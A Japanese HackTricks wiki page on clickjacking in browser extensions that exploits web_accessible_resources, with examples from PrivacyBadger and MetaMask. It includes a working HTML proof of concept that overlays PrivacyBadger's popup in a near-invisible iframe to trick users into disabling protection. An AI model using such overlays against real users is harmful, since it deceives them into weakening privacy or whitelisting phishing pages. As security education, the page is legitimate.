# BrowExt - ClickJacking

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する。

</details>

## 基本情報

このページでは、ブラウザ拡張機能のClickJackingの脆弱性を悪用します。\
ClickJackingが何かわからない場合は、以下を確認してください:

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

拡張機能には**`manifest.json`**ファイルが含まれており、そのJSONファイルには`web_accessible_resources`というフィールドがあります。[Chromeのドキュメント](https://developer.chrome.com/extensions/manifest/web_accessible_resources)には次のように記載されています:

> これらのリソースは、**`chrome-extension://[PACKAGE ID]/[PATH]`**のURLを介してウェブページで利用可能になります。このURLは**`extension.getURL method`**で生成できます。ホワイトリストに登録されたリソースは適切なCORSヘッダーで提供されるため、XHRなどのメカニズムを介して利用できます。[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

**`web_accessible_resources`**にあるリソースはウェブアクセス可能であるだけでなく、拡張機能の周辺権限で動作します：状態を変更したり、他のリソースを読み込んだり、特定の方法でブラウザを変更することができます。`web_accessible_resources`内のドキュメントが何らかの興味深い動作を行うことができる場合、攻撃者はそれをウェブページに埋め込み、訪問者をだましてそれをトリガーさせることができます。

## PrivacyBadgerの例

拡張機能PrivacyBadgerにおいて、`skin/`ディレクトリの内容が`web_accessible_resources`であることが発見されました：
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
```markdown
したがって、`skin/popup.html`をロードすることにより、ブラウザのPrivacyBadgerアイコンをクリックしたときにレンダリングされるドキュメントをiframe内で表示することで、ユーザーをだまして「このウェブサイトのPrivacyBadgerを無効にする」をクリックさせることができます。これにより、ユーザーは追加のトラッキングを受けることになり、PrivacyBadgerの機能が損なわれます。**ClickJackingのビデオ例をチェックしてください** [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm)

修正は簡単でした：**`web_accessible_resources`から`/skin/*`を削除します**。

### PoC
```
```html
<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Metamaskの例

MetamaskでのClickJackingに関する[**ブログ投稿はこちら**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)で見つけることができます。このケースでは、Metamaskは**`https:`** または **`http:`** プロトコル（例えば **`chrome:`** ではない）を使用してアクセスされたことを確認することで脆弱性を修正しました：

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**もう一つのClickJackingが修正された** Metamask拡張機能では、`“web_accessible_resources”: [“inpage.js”, “phishing.html”]`のためにフィッシングと疑われるページに対してユーザーが**クリックしてホワイトリストに追加**することができました。そのページがClickjackingに対して脆弱であったため、攻撃者は正常なものを表示して被害者に気づかれずにホワイトリストに追加するためのクリックをさせ、その後フィッシングページに戻ると、それがホワイトリストに追加されている状態になります。

## Steam Inventory Helperの例

以下のページをチェックして、ブラウザ拡張機能の**XSS**が**ClickJacking**の脆弱性とどのように連鎖したかを確認してください：

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## 参考文献

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)

<details>

<summary><strong>AWSのハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの**会社を広告したい、または**HackTricksをPDFでダウンロード**したい場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* **あなたのハッキングのコツを、** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のgithubリポジトリにPRを提出することで共有してください。

</details>
